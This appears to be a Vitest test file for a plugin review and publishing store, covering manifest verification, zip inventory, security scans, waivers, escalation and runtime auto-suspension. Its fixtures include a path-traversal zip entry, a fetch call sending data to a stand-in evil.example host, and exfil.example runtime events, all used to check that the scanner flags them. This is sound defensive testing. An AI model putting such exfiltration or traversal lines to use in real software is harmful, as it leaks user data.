import { mkdtemp, readFile, rm } from 'node:fs/promises'
import { createHash } from 'node:crypto'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { describe, expect, it, beforeEach, afterEach } from 'vitest'
import JSZip from 'jszip'
import type { PluginManifest, ReviewDecisionRequest } from '@chatbridge/shared'
import { createDeveloperPlatformStore } from '../src/store.js'

const manifest: PluginManifest = {
  pluginId: 'weather-lab',
  name: 'Weather Lab',
  version: '1.0.0',
  description: 'Weather plugin',
  entrypoint: '/index.html',
  ageRating: '8+',
  collectsInput: true,
  inputFields: [{ name: 'search_query', required: true, kind: 'text' }],
  permissions: ['weather.read'],
  networkDomains: ['api.weather.example'],
  dataPolicyUrl: 'https://example.com/privacy',
  externalResources: [],
  sriHashes: [],
  tools: [
    {
      name: 'lookup_weather',
      description: 'Lookup weather',
      inputSchema: { type: 'object' },
    },
  ],
}

function buildReviewDecision(
  scanRunId: string,
  overrides: Partial<ReviewDecisionRequest> = {},
): ReviewDecisionRequest {
  return {
    decision: 'approve',
    reasonCode: 'clean_review',
    notes: 'Reviewer verified the hosted artifact, matched the manifest to the bundle, and captured runtime evidence for the approved behavior.',
    reviewerId: 'reviewer-1',
    scanContext: {
      rulesetVersion: 'dp-sec-v1',
      scanRunIds: [scanRunId],
      referencedFindingRuleIds: [],
    },
    checklist: [
      { itemId: 'platform_hosting_only', status: 'pass', notes: 'Hosted URL points to plugins.chatbridge.app' },
      { itemId: 'manifest_matches_artifact', status: 'pass', notes: 'Entrypoint and metadata match extracted bundle' },
      { itemId: 'declared_network_domains_match_observed_behavior', status: 'pass', notes: 'Observed requests stay within declared domains' },
      { itemId: 'tool_contract_matches_runtime_behavior', status: 'pass', notes: 'Tool behavior matches manifest contract' },
      { itemId: 'data_collection_and_permissions_disclosed', status: 'pass', notes: 'Input fields and permissions are accurately disclosed' },
      { itemId: 'age_rating_and_student_safety_reviewed', status: 'pass', notes: 'Age rating aligns with student-facing experience' },
      { itemId: 'security_findings_triaged', status: 'pass', notes: 'No unresolved findings remain' },
      { itemId: 'runtime_evidence_captured', status: 'pass', notes: 'Reviewer captured runtime network and UI evidence' },
    ],
    evidence: [
      {
        source: 'platform_scan',
        summary: 'Static scan completed with no unresolved blockers',
        location: 'scan-run-42',
        capturedAt: '2026-04-05T18:00:00.000Z',
        findingIds: [],
      },
      {
        source: 'reviewer_runtime_capture',
        summary: 'Runtime session showed only declared traffic and expected tool behavior',
        location: 's3://review-evidence/weather-lab/runtime-session-1',
        capturedAt: '2026-04-05T18:05:00.000Z',
        findingIds: [],
      },
    ],
    ...overrides,
  }
}

async function getSingleScanRunId(
  store: Awaited<ReturnType<typeof createDeveloperPlatformStore>>,
  pluginSlug: string,
  versionId: string,
) {
  for (let attempt = 0; attempt < 50; attempt += 1) {
    const scanRuns = await store.listScanRuns(pluginSlug, versionId)
    if (scanRuns.length === 1 && ['completed', 'failed'].includes(scanRuns[0].status)) {
      return scanRuns[0].id
    }
    await new Promise((resolve) => setTimeout(resolve, 10))
  }

  const scanRuns = await store.listScanRuns(pluginSlug, versionId)
  expect(scanRuns).toHaveLength(1)
  expect(['completed', 'failed']).toContain(scanRuns[0].status)
  return scanRuns[0].id
}

describe('developerPlatformStore', () => {
  let tempDir: string
  let dbPath: string

  beforeEach(async () => {
    tempDir = await mkdtemp(path.join(tmpdir(), 'developer-platform-'))
    dbPath = path.join(tempDir, 'store.json')
  })

  afterEach(async () => {
    await rm(tempDir, { recursive: true, force: true })
  })

  it('persists plugin, approval, and explicit publish metadata across store re-instantiation', async () => {
    const store = await createDeveloperPlatformStore(dbPath)
    const plugin = await store.createPlugin({
      slug: 'weather-lab',
      name: 'Weather Lab',
      description: 'Weather plugin',
      developer: {
        name: 'Weather Lab LLC',
        email: 'ops@weatherlab.example',
        organization: 'Weather Lab LLC',
      },
      dpaRecord: {
        status: 'approved',
        documentUrl: 'https://example.com/dpa/weather-lab.pdf',
        approvedAt: '2026-04-05T17:00:00.000Z',
      },
    })
    const version = await store.createVersion(plugin.slug, {
      version: '1.0.0',
      manifest,
    })

    await store.saveArtifactUpload(plugin.slug, version.id, {
      fileName: 'weather-lab.js',
      contentType: 'application/javascript',
      body: Buffer.from('console.log("weather")', 'utf8'),
    })
    await store.submitVersion(plugin.slug, version.id)
    const scanRunId = await getSingleScanRunId(store, plugin.slug, version.id)
    await store.reviewVersion(plugin.slug, version.id, buildReviewDecision(scanRunId))
    await store.publishVersion(plugin.slug, version.id)

    const reloaded = await createDeveloperPlatformStore(dbPath)
    const app = await reloaded.getRegistryApp('weather-lab')
    const audit = await reloaded.getPluginAudit('weather-lab')

    expect(app).not.toBeNull()
    expect(app?.hostedUrl).toBe('https://plugins.chatbridge.app/weather-lab/v1.0.0/')
    expect(app?.enabled).toBe(true)
    expect(app?.trustTier).toBe('reviewed')
    expect(audit?.reviewDecisions).toHaveLength(1)
    expect(audit?.developer).toEqual(
      expect.objectContaining({
        email: 'ops@weatherlab.example',
      }),
    )
    expect(audit?.dpaRecords).toEqual([
      expect.objectContaining({
        status: 'approved',
        documentUrl: 'https://example.com/dpa/weather-lab.pdf',
      }),
    ])
    expect(audit?.reviewDecisions[0]).toEqual(
      expect.objectContaining({
        decision: 'approve',
        reasonCode: 'clean_review',
        outcome: 'approved',
      }),
    )
  })

  it('rejects submitting a version without artifact metadata', async () => {
    const store = await createDeveloperPlatformStore(dbPath)
    await store.createPlugin({
      slug: 'weather-lab',
      name: 'Weather Lab',
      description: 'Weather plugin',
    })
    const version = await store.createVersion('weather-lab', {
      version: '1.0.0',
      manifest,
    })

    await expect(store.submitVersion('weather-lab', version.id)).rejects.toThrow(
      'artifact_required:weather-lab',
    )
  })

  it('rejects creating a version when manifest.pluginId does not match the plugin slug', async () => {
    const store = await createDeveloperPlatformStore(dbPath)
    await store.createPlugin({
      slug: 'weather-lab',
      name: 'Weather Lab',
      description: 'Weather plugin',
    })

    await expect(store.createVersion('weather-lab', {
      version: '1.0.0',
      manifest: {
        ...manifest,
        pluginId: 'different-plugin',
      },
    })).rejects.toThrow('manifest_plugin_id_mismatch:weather-lab:different-plugin')
  })

  it('records a waiver as auditable approval distinct from a clean approval', async () => {
    const store = await createDeveloperPlatformStore(dbPath)
    await store.createPlugin({
      slug: 'weather-lab',
      name: 'Weather Lab',
      description: 'Weather plugin',
    })
    const version = await store.createVersion('weather-lab', {
      version: '1.0.0',
      manifest,
    })
    await store.saveArtifactUpload('weather-lab', version.id, {
      fileName: 'weather-lab.js',
      contentType: 'application/javascript',
      body: Buffer.from('console.log("weather")', 'utf8'),
    })
    await store.submitVersion('weather-lab', version.id)
    const scanRunId = await getSingleScanRunId(store, 'weather-lab', version.id)

    await store.reviewVersion('weather-lab', version.id, buildReviewDecision(scanRunId, {
      decision: 'waive',
      reasonCode: 'student_safety_risk',
      checklist: buildReviewDecision(scanRunId).checklist.map((item) =>
        item.itemId === 'age_rating_and_student_safety_reviewed'
          ? { ...item, status: 'waived', notes: 'Temporary waiver while classroom guardrails are added' }
          : item
      ),
      waiver: {
        rationale: 'The content is suitable for limited pilot use while a wording cleanup patch is submitted.',
        approvedBy: 'platform-admin-7',
        scope: 'District pilot with manual monitoring',
        compensatingControls: ['District allowlist only', 'Weekly runtime log review'],
      },
    }))
    await store.publishVersion('weather-lab', version.id)

    const audit = await store.getPluginAudit('weather-lab')
    expect(audit?.reviewDecisions[0]).toEqual(
      expect.objectContaining({
        decision: 'waive',
        outcome: 'approved',
        waiver: expect.objectContaining({
          approvedBy: 'platform-admin-7',
        }),
      }),
    )
  })

  it('keeps escalated versions out of the registry while preserving the escalation path in audit history', async () => {
    const store = await createDeveloperPlatformStore(dbPath)
    await store.createPlugin({
      slug: 'weather-lab',
      name: 'Weather Lab',
      description: 'Weather plugin',
    })
    const version = await store.createVersion('weather-lab', {
      version: '1.0.0',
      manifest,
    })
    await store.saveArtifactUpload('weather-lab', version.id, {
      fileName: 'weather-lab.js',
      contentType: 'application/javascript',
      body: Buffer.from('console.log("weather")', 'utf8'),
    })
    await store.submitVersion('weather-lab', version.id)
    const scanRunId = await getSingleScanRunId(store, 'weather-lab', version.id)

    const result = await store.reviewVersion('weather-lab', version.id, buildReviewDecision(scanRunId, {
      decision: 'escalate',
      reasonCode: 'needs_security_escalation',
      notes: 'Observed obfuscated network bootstrap code requires a security review before any approval.',
      escalation: {
        path: 'security',
        severity: 'critical',
        summary: 'Obfuscated bootstrap behavior and undeclared network destinations were observed.',
        blocking: true,
      },
    }))

    const app = await store.getRegistryApp('weather-lab')
    const audit = await store.getPluginAudit('weather-lab')

    expect(result.version.status).toBe('awaiting_review')
    expect(app).toBeNull()
    expect(audit?.reviewDecisions[0]).toEqual(
      expect.objectContaining({
        decision: 'escalate',
        outcome: 'escalated',
        escalation: expect.objectContaining({
          path: 'security',
        }),
      }),
    )
  })

  it('can roll back the active published version to a previously approved target', async () => {
    const store = await createDeveloperPlatformStore(dbPath)
    await store.createPlugin({
      slug: 'rollback-lab',
      name: 'Rollback Lab',
      description: 'Rollback plugin',
    })

    const version1 = await store.createVersion('rollback-lab', {
      version: '1.0.0',
      manifest: {
        ...manifest,
        pluginId: 'rollback-lab',
        name: 'Rollback Lab',
      },
    })
    await store.saveArtifactUpload('rollback-lab', version1.id, {
      fileName: 'rollback-v1.js',
      contentType: 'application/javascript',
      body: Buffer.from('console.log("v1")', 'utf8'),
    })
    await store.submitVersion('rollback-lab', version1.id)
    const scanRun1 = await getSingleScanRunId(store, 'rollback-lab', version1.id)
    await store.reviewVersion('rollback-lab', version1.id, buildReviewDecision(scanRun1))
    await store.publishVersion('rollback-lab', version1.id)

    const version2 = await store.createVersion('rollback-lab', {
      version: '1.1.0',
      manifest: {
        ...manifest,
        pluginId: 'rollback-lab',
        name: 'Rollback Lab',
        version: '1.1.0',
      },
    })
    await store.saveArtifactUpload('rollback-lab', version2.id, {
      fileName: 'rollback-v2.js',
      contentType: 'application/javascript',
      body: Buffer.from('console.log("v2")', 'utf8'),
    })
    await store.submitVersion('rollback-lab', version2.id)
    const scanRun2 = await getSingleScanRunId(store, 'rollback-lab', version2.id)
    await store.reviewVersion('rollback-lab', version2.id, buildReviewDecision(scanRun2))
    await store.publishVersion('rollback-lab', version2.id)

    expect((await store.getRegistryVersion('rollback-lab'))?.activeVersion).toBe('1.1.0')

    await store.rollbackPublishedVersion('rollback-lab', version1.id)
    expect((await store.getRegistryVersion('rollback-lab'))?.activeVersion).toBe('1.0.0')
  })

  it('stores uploaded artifact bytes with derived immutable metadata that survives reload', async () => {
    const store = await createDeveloperPlatformStore(dbPath)
    await store.createPlugin({
      slug: 'weather-lab',
      name: 'Weather Lab',
      description: 'Weather plugin',
    })
    const version = await store.createVersion('weather-lab', {
      version: '2.0.0',
      manifest: { ...manifest, version: '2.0.0' },
    })

    const zipBytes = Buffer.from('fake-zip-payload-for-weather-lab', 'utf8')
    const artifact = await store.saveArtifactUpload('weather-lab', version.id, {
      fileName: '../weather-lab.zip',
      contentType: 'application/zip',
      body: zipBytes,
    })

    expect(artifact.fileName).toBe('weather-lab.zip')
    expect(artifact.sizeBytes).toBe(zipBytes.byteLength)
    expect(artifact.sha256).toBe(createHash('sha256').update(zipBytes).digest('hex'))
    expect(artifact.storageKey).toBeDefined()

    const storedBytes = await readFile(path.join(tempDir, artifact.storageKey!))
    expect(storedBytes.equals(zipBytes)).toBe(true)

    const reloaded = await createDeveloperPlatformStore(dbPath)
    const snapshot = await reloaded.getDebugSnapshot()
    expect(snapshot.versions.find((entry) => entry.id === version.id)?.artifact).toEqual(artifact)
  })

  it('normalizes uploaded zip artifacts into a deterministic file inventory', async () => {
    const store = await createDeveloperPlatformStore(dbPath)
    await store.createPlugin({
      slug: 'inventory-lab',
      name: 'Inventory Lab',
      description: 'Inventory plugin',
    })
    const version = await store.createVersion('inventory-lab', {
      version: '1.0.0',
      manifest: {
        ...manifest,
        pluginId: 'inventory-lab',
        name: 'Inventory Lab',
      },
    })

    const zip = new JSZip()
    zip.file('index.html', '<html><body>Hello</body></html>')
    zip.file('assets/main.js', 'console.log("hi")')
    const zipBytes = Buffer.from(await zip.generateAsync({ type: 'nodebuffer' }))

    const artifact = await store.saveArtifactUpload('inventory-lab', version.id, {
      fileName: 'inventory-lab.zip',
      contentType: 'application/zip',
      body: zipBytes,
    })

    const inventory = await store.getArtifactInventory('inventory-lab', version.id)
    expect(inventory).toEqual({
      fileCount: 2,
      totalUncompressedBytes: Buffer.byteLength('<html><body>Hello</body></html>') + Buffer.byteLength('console.log("hi")'),
      entries: [
        expect.objectContaining({
          path: 'assets/main.js',
          sizeBytes: Buffer.byteLength('console.log("hi")'),
        }),
        expect.objectContaining({
          path: 'index.html',
          sizeBytes: Buffer.byteLength('<html><body>Hello</body></html>'),
        }),
      ],
    })

    const reloaded = await createDeveloperPlatformStore(dbPath)
    expect(await reloaded.getArtifactInventory('inventory-lab', version.id)).toEqual(inventory)
    expect((await reloaded.getDebugSnapshot()).versions.find((entry) => entry.id === version.id)?.artifact).toEqual(artifact)
  })

  it('rejects zip artifacts containing unsafe traversal paths', async () => {
    const store = await createDeveloperPlatformStore(dbPath)
    await store.createPlugin({
      slug: 'unsafe-zip',
      name: 'Unsafe Zip',
      description: 'Unsafe inventory plugin',
    })
    const version = await store.createVersion('unsafe-zip', {
      version: '1.0.0',
      manifest: {
        ...manifest,
        pluginId: 'unsafe-zip',
        name: 'Unsafe Zip',
      },
    })

    const zip = new JSZip()
    zip.file('../escape.js', 'alert("bad")')
    const zipBytes = Buffer.from(await zip.generateAsync({ type: 'nodebuffer' }))

    await expect(store.saveArtifactUpload('unsafe-zip', version.id, {
      fileName: 'unsafe-zip.zip',
      contentType: 'application/zip',
      body: zipBytes,
    })).rejects.toThrow('artifact_inventory_unsafe_path:unsafe-zip')
  })

  it('records nested archives in the inventory so second-stage payloads are visible to reviewers', async () => {
    const store = await createDeveloperPlatformStore(dbPath)
    await store.createPlugin({
      slug: 'nested-archive-lab',
      name: 'Nested Archive Lab',
      description: 'Nested archive inventory plugin',
    })
    const version = await store.createVersion('nested-archive-lab', {
      version: '1.0.0',
      manifest: {
        ...manifest,
        pluginId: 'nested-archive-lab',
        name: 'Nested Archive Lab',
      },
    })

    const innerZip = new JSZip()
    innerZip.file('payload.js', 'console.log("nested payload")')
    const innerZipBytes = Buffer.from(await innerZip.generateAsync({ type: 'nodebuffer' }))

    const outerZip = new JSZip()
    outerZip.file('index.html', '<html><body>launcher</body></html>')
    outerZip.file('assets/payload.zip', innerZipBytes)
    const outerZipBytes = Buffer.from(await outerZip.generateAsync({ type: 'nodebuffer' }))

    await store.saveArtifactUpload('nested-archive-lab', version.id, {
      fileName: 'nested-archive-lab.zip',
      contentType: 'application/zip',
      body: outerZipBytes,
    })

    const inventory = await store.getArtifactInventory('nested-archive-lab', version.id)
    expect(inventory?.entries).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          path: 'assets/payload.zip',
        }),
        expect.objectContaining({
          path: 'index.html',
        }),
      ]),
    )
  })

  it('flags manifest-to-artifact mismatches for undeclared network access and undeclared input collection', async () => {
    const store = await createDeveloperPlatformStore(dbPath)
    await store.createPlugin({
      slug: 'policy-lab',
      name: 'Policy Lab',
      description: 'Policy verification plugin',
    })
    const version = await store.createVersion('policy-lab', {
      version: '1.0.0',
      manifest: {
        ...manifest,
        pluginId: 'policy-lab',
        name: 'Policy Lab',
        collectsInput: false,
        inputFields: [],
        networkDomains: ['api.weather.example'],
        externalResources: [],
      },
    })

    const zip = new JSZip()
    zip.file(
      'index.html',
      '<html><body><form><input name="student_name" /></form><script src="https://cdn.example.com/app.js"></script></body></html>',
    )
    zip.file(
      'assets/main.js',
      'fetch("https://evil.example/collect"); const img = "https://cdn.example.com/image.png";',
    )
    const zipBytes = Buffer.from(await zip.generateAsync({ type: 'nodebuffer' }))

    await store.saveArtifactUpload('policy-lab', version.id, {
      fileName: 'policy-lab.zip',
      contentType: 'application/zip',
      body: zipBytes,
    })

    const verification = await store.verifyManifestAgainstArtifact('policy-lab', version.id)
    expect(verification.observedNetworkDomains).toEqual(
      expect.arrayContaining(['cdn.example.com', 'evil.example']),
    )
    expect(verification.observedInputSurfaces).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          kind: 'html_input',
          path: 'index.html',
        }),
      ]),
    )
    expect(verification.findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: 'network-undeclared-domain',
          category: 'policy_mismatch',
          disposition: 'fail',
        }),
        expect.objectContaining({
          code: 'INPUT-UNDECLARED',
          category: 'policy_mismatch',
          disposition: 'fail',
        }),
      ]),
    )
  })

  it('flags undeclared external resources and undeclared input field identifiers', async () => {
    const store = await createDeveloperPlatformStore(dbPath)
    await store.createPlugin({
      slug: 'field-policy-lab',
      name: 'Field Policy Lab',
      description: 'Field policy verification plugin',
    })
    const version = await store.createVersion('field-policy-lab', {
      version: '1.0.0',
      manifest: {
        ...manifest,
        pluginId: 'field-policy-lab',
        name: 'Field Policy Lab',
        collectsInput: true,
        inputFields: [{ name: 'search_query', required: true, kind: 'text' }],
        networkDomains: ['api.weather.example'],
        externalResources: ['https://cdn.allowed.example/app.js'],
      },
    })

    const zip = new JSZip()
    zip.file(
      'index.html',
      '<html><body><input name="student_name" /><img src="https://images.example.com/pixel.png" /><script src="https://cdn.allowed.example/app.js"></script></body></html>',
    )
    const zipBytes = Buffer.from(await zip.generateAsync({ type: 'nodebuffer' }))

    await store.saveArtifactUpload('field-policy-lab', version.id, {
      fileName: 'field-policy-lab.zip',
      contentType: 'application/zip',
      body: zipBytes,
    })

    const verification = await store.verifyManifestAgainstArtifact('field-policy-lab', version.id)
    expect(verification.findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          code: 'RESOURCE-UNDECLARED',
          disposition: 'fail',
          metadata: expect.objectContaining({
            resource: 'https://images.example.com/pixel.png',
          }),
        }),
        expect.objectContaining({
          code: 'INPUT-FIELD-UNDECLARED',
          disposition: 'fail',
          metadata: expect.objectContaining({
            identifier: 'student_name',
          }),
        }),
      ]),
    )
  })

  it('auto-creates a persisted clean scan run during submission', async () => {
    const store = await createDeveloperPlatformStore(dbPath)
    await store.createPlugin({
      slug: 'scan-lab',
      name: 'Scan Lab',
      description: 'Scan workflow plugin',
    })
    const version = await store.createVersion('scan-lab', {
      version: '1.0.0',
      manifest: {
        ...manifest,
        pluginId: 'scan-lab',
        name: 'Scan Lab',
      },
    })

    await store.saveArtifactUpload('scan-lab', version.id, {
      fileName: 'scan-lab.js',
      contentType: 'application/javascript',
      body: Buffer.from('console.log("safe")', 'utf8'),
    })
    const submittedVersion = await store.submitVersion('scan-lab', version.id)
    const scanRunId = await getSingleScanRunId(store, 'scan-lab', version.id)
    const [scanRun] = await store.listScanRuns('scan-lab', version.id)
    const snapshot = await store.getDebugSnapshot()

    expect(submittedVersion.status).toBe('awaiting_review')
    expect(scanRunId).toBe(scanRun.id)
    expect(scanRun).toEqual(
      expect.objectContaining({
        pluginId: 'scan-lab',
        pluginVersionId: version.id,
        status: 'completed',
        overallDisposition: 'pass',
      }),
    )
    expect(snapshot.scanRuns.find((entry) => entry.id === scanRun.id)).toEqual(scanRun)
    expect(snapshot.versions.find((entry) => entry.id === version.id)?.status).toBe('awaiting_review')
  })

  it('auto-marks versions as scan_failed during submission when auto-scan finds a blocker', async () => {
    const store = await createDeveloperPlatformStore(dbPath)
    await store.createPlugin({
      slug: 'failed-scan-lab',
      name: 'Failed Scan Lab',
      description: 'Failed scan workflow plugin',
    })
    const version = await store.createVersion('failed-scan-lab', {
      version: '1.0.0',
      manifest: {
        ...manifest,
        pluginId: 'failed-scan-lab',
        name: 'Failed Scan Lab',
        networkDomains: ['api.weather.example'],
        collectsInput: false,
        inputFields: [],
      },
    })

    await store.saveArtifactUpload('failed-scan-lab', version.id, {
      fileName: 'failed-scan-lab.zip',
      contentType: 'application/zip',
      body: Buffer.from(await (async () => {
        const zip = new JSZip()
        zip.file('index.html', '<input name="student_name" /><script src="https://evil.example/app.js"></script>')
        return zip.generateAsync({ type: 'nodebuffer' })
      })()),
    })
    const submittedVersion = await store.submitVersion('failed-scan-lab', version.id)
    await getSingleScanRunId(store, 'failed-scan-lab', version.id)
    const [scanRun] = await store.listScanRuns('failed-scan-lab', version.id)
    const snapshot = await store.getDebugSnapshot()

    expect(submittedVersion.status).toBe('scan_failed')
    expect(scanRun.overallDisposition).toBe('fail')
    expect(snapshot.scanRuns.find((entry) => entry.id === scanRun.id)).toEqual(scanRun)
    expect(snapshot.versions.find((entry) => entry.id === version.id)?.status).toBe('scan_failed')
  })

  it('rejects rescanning a published version so runtime registry resolution stays stable', async () => {
    const store = await createDeveloperPlatformStore(dbPath)
    await store.createPlugin({
      slug: 'rescan-guard-lab',
      name: 'Rescan Guard Lab',
      description: 'Published rescan guard',
    })
    const version = await store.createVersion('rescan-guard-lab', {
      version: '1.0.0',
      manifest: {
        ...manifest,
        pluginId: 'rescan-guard-lab',
        name: 'Rescan Guard Lab',
      },
    })

    await store.saveArtifactUpload('rescan-guard-lab', version.id, {
      fileName: 'rescan-guard-lab.js',
      contentType: 'application/javascript',
      body: Buffer.from('console.log("stable runtime")', 'utf8'),
    })
    await store.submitVersion('rescan-guard-lab', version.id)
    const scanRunId = await getSingleScanRunId(store, 'rescan-guard-lab', version.id)
    await store.reviewVersion('rescan-guard-lab', version.id, buildReviewDecision(scanRunId))
    await store.publishVersion('rescan-guard-lab', version.id)

    await expect(store.createScanRun('rescan-guard-lab', version.id, [])).rejects.toThrow(
      'scan_state_invalid:rescan-guard-lab:published',
    )
    expect((await store.getRegistryVersion('rescan-guard-lab'))?.activeVersion).toBe('1.0.0')
  })

  it('marks the version as scan_failed when scan execution crashes after entering scanning', async () => {
    const store = await createDeveloperPlatformStore(dbPath)
    await store.createPlugin({
      slug: 'scan-crash-lab',
      name: 'Scan Crash Lab',
      description: 'Crash recovery',
    })
    const version = await store.createVersion('scan-crash-lab', {
      version: '1.0.0',
      manifest: {
        ...manifest,
        pluginId: 'scan-crash-lab',
        name: 'Scan Crash Lab',
      },
    })

    const artifact = await store.saveArtifactUpload('scan-crash-lab', version.id, {
      fileName: 'scan-crash-lab.js',
      contentType: 'application/javascript',
      body: Buffer.from('console.log("crash me")', 'utf8'),
    })
    await rm(path.join(tempDir, artifact.storageKey!), { force: true })

    const scanRun = await store.createScanRun('scan-crash-lab', version.id, [])
    await getSingleScanRunId(store, 'scan-crash-lab', version.id)
    const snapshot = await store.getDebugSnapshot()
    const storedScanRun = snapshot.scanRuns.find((entry) => entry.id === scanRun.id)

    expect(storedScanRun?.status).toBe('failed')
    expect(snapshot.versions.find((entry) => entry.id === version.id)?.status).toBe('scan_failed')
  })

  it('applies district-level plugin overrides when resolving registry apps for context', async () => {
    const store = await createDeveloperPlatformStore(dbPath)
    await store.createPlugin({
      slug: 'district-override-lab',
      name: 'District Override Lab',
      description: 'District policy plugin',
    })
    const version = await store.createVersion('district-override-lab', {
      version: '1.0.0',
      manifest: {
        ...manifest,
        pluginId: 'district-override-lab',
        name: 'District Override Lab',
      },
    })

    await store.saveArtifactUpload('district-override-lab', version.id, {
      fileName: 'district-override-lab.js',
      contentType: 'application/javascript',
      body: Buffer.from('console.log("district policy")', 'utf8'),
    })
    await store.submitVersion('district-override-lab', version.id)
    const scanRunId = await getSingleScanRunId(store, 'district-override-lab', version.id)
    await store.reviewVersion('district-override-lab', version.id, buildReviewDecision(scanRunId))
    await store.publishVersion('district-override-lab', version.id)

    const districtA = '550e8400-e29b-41d4-a716-446655440010'
    const districtB = '550e8400-e29b-41d4-a716-446655440011'

    expect(await store.listRegistryAppsForContext({ districtId: districtA })).toEqual([
      expect.objectContaining({
        pluginId: 'district-override-lab',
      }),
    ])

    await store.setDistrictPluginOverride({
      districtId: districtA,
      pluginId: 'district-override-lab',
      enabled: false,
    })

    expect(await store.listRegistryAppsForContext({ districtId: districtA })).toEqual([])
    expect(await store.listRegistryAppsForContext({ districtId: districtB })).toEqual([
      expect.objectContaining({
        pluginId: 'district-override-lab',
      }),
    ])
  })

  it('records suspension, reinstatement, and rollback control-plane actions in the audit trail and update log', async () => {
    const store = await createDeveloperPlatformStore(dbPath)
    await store.createPlugin({
      slug: 'control-plane-lab',
      name: 'Control Plane Lab',
      description: 'Control plane actions',
    })
    const version = await store.createVersion('control-plane-lab', {
      version: '1.0.0',
      manifest: {
        ...manifest,
        pluginId: 'control-plane-lab',
        name: 'Control Plane Lab',
      },
    })

    await store.saveArtifactUpload('control-plane-lab', version.id, {
      fileName: 'control-plane-lab.js',
      contentType: 'application/javascript',
      body: Buffer.from('console.log("control plane")', 'utf8'),
    })
    await store.submitVersion('control-plane-lab', version.id)
    const scanRunId = await getSingleScanRunId(store, 'control-plane-lab', version.id)
    await store.reviewVersion('control-plane-lab', version.id, buildReviewDecision(scanRunId))
    await store.publishVersion('control-plane-lab', version.id)
    await store.suspendPlugin('control-plane-lab', { actor: 'ops-admin', reason: 'kill switch exercise' })
    await store.reinstatePlugin('control-plane-lab', { actor: 'ops-admin', reason: 'issue resolved' })

    const audit = await store.getPluginAudit('control-plane-lab')
    const updates = await store.listRegistryUpdates({ pluginId: 'control-plane-lab' })

    expect(audit?.controlActions).toEqual([
      expect.objectContaining({ type: 'plugin_rolled_forward' }),
      expect.objectContaining({
        type: 'plugin_suspended',
        metadata: expect.objectContaining({ actor: 'ops-admin' }),
      }),
      expect.objectContaining({
        type: 'plugin_reinstated',
        metadata: expect.objectContaining({ restoredStatus: 'approved' }),
      }),
    ])
    expect(updates.map((entry) => entry.type)).toEqual([
      'plugin_rolled_forward',
      'plugin_suspended',
      'plugin_reinstated',
    ])
  })

  it('persists runtime incidents as auditable evidence for a published plugin', async () => {
    const store = await createDeveloperPlatformStore(dbPath)
    await store.createPlugin({
      slug: 'runtime-incident-lab',
      name: 'Runtime Incident Lab',
      description: 'Runtime incident evidence',
    })
    const version = await store.createVersion('runtime-incident-lab', {
      version: '1.0.0',
      manifest: {
        ...manifest,
        pluginId: 'runtime-incident-lab',
        name: 'Runtime Incident Lab',
      },
    })

    await store.saveArtifactUpload('runtime-incident-lab', version.id, {
      fileName: 'runtime-incident-lab.js',
      contentType: 'application/javascript',
      body: Buffer.from('console.log("runtime incident lab")', 'utf8'),
    })
    await store.submitVersion('runtime-incident-lab', version.id)
    const scanRunId = await getSingleScanRunId(store, 'runtime-incident-lab', version.id)
    await store.reviewVersion('runtime-incident-lab', version.id, buildReviewDecision(scanRunId))
    await store.publishVersion('runtime-incident-lab', version.id)

    const incident = await store.ingestRuntimeEvent({
      pluginId: 'runtime-incident-lab',
      pluginVersionId: version.id,
      eventType: 'unexpected_network_request',
      districtId: '550e8400-e29b-41d4-a716-446655440099',
      metadata: {
        severity: 'high',
        observedDomain: 'analytics.evil.example',
        requestUrl: 'https://analytics.evil.example/beacon',
      },
    })

    const incidents = await store.listRuntimeIncidents('runtime-incident-lab')
    const audit = await store.getPluginAudit('runtime-incident-lab')

    expect(incident).toEqual(
      expect.objectContaining({
        eventType: 'unexpected_network_request',
        status: 'open',
        suspensionTriggered: false,
      }),
    )
    expect(incidents).toEqual([
      expect.objectContaining({
        id: incident.id,
        metadata: expect.objectContaining({
          observedDomain: 'analytics.evil.example',
        }),
      }),
    ])
    expect(audit?.runtimeIncidents).toEqual([
      expect.objectContaining({
        id: incident.id,
        eventType: 'unexpected_network_request',
      }),
    ])
  })

  it('auto-suspends a published plugin after repeated high-severity runtime violations and records the trigger evidence', async () => {
    const store = await createDeveloperPlatformStore(dbPath)
    await store.createPlugin({
      slug: 'runtime-threshold-lab',
      name: 'Runtime Threshold Lab',
      description: 'Runtime threshold evidence',
    })
    const version = await store.createVersion('runtime-threshold-lab', {
      version: '1.0.0',
      manifest: {
        ...manifest,
        pluginId: 'runtime-threshold-lab',
        name: 'Runtime Threshold Lab',
      },
    })

    await store.saveArtifactUpload('runtime-threshold-lab', version.id, {
      fileName: 'runtime-threshold-lab.js',
      contentType: 'application/javascript',
      body: Buffer.from('console.log("threshold lab")', 'utf8'),
    })
    await store.submitVersion('runtime-threshold-lab', version.id)
    const scanRunId = await getSingleScanRunId(store, 'runtime-threshold-lab', version.id)
    await store.reviewVersion('runtime-threshold-lab', version.id, buildReviewDecision(scanRunId))
    await store.publishVersion('runtime-threshold-lab', version.id)

    await store.ingestRuntimeEvent({
      pluginId: 'runtime-threshold-lab',
      pluginVersionId: version.id,
      eventType: 'runtime_violation',
      metadata: { severity: 'high', reason: 'hidden iframe bootstrap' },
    })
    await store.ingestRuntimeEvent({
      pluginId: 'runtime-threshold-lab',
      pluginVersionId: version.id,
      eventType: 'runtime_violation',
      metadata: { severity: 'high', reason: 'undeclared websocket destination' },
    })
    const triggeringIncident = await store.ingestRuntimeEvent({
      pluginId: 'runtime-threshold-lab',
      pluginVersionId: version.id,
      eventType: 'unexpected_network_request',
      metadata: { severity: 'critical', observedDomain: 'exfil.example' },
    })

    const audit = await store.getPluginAudit('runtime-threshold-lab')
    const updates = await store.listRegistryUpdates({ pluginId: 'runtime-threshold-lab' })
    const runtimeVersion = await store.getRegistryVersion('runtime-threshold-lab')

    expect(triggeringIncident).toEqual(
      expect.objectContaining({
        suspensionTriggered: true,
        status: 'triaged',
      }),
    )
    expect(runtimeVersion?.status).toBe('suspended')
    expect(audit?.controlActions).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          type: 'plugin_suspended',
          metadata: expect.objectContaining({
            actor: 'runtime_monitor',
            trigger: 'runtime_incident_threshold',
          }),
        }),
      ]),
    )
    expect(updates).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ type: 'runtime_violation' }),
        expect.objectContaining({ type: 'unexpected_network_request' }),
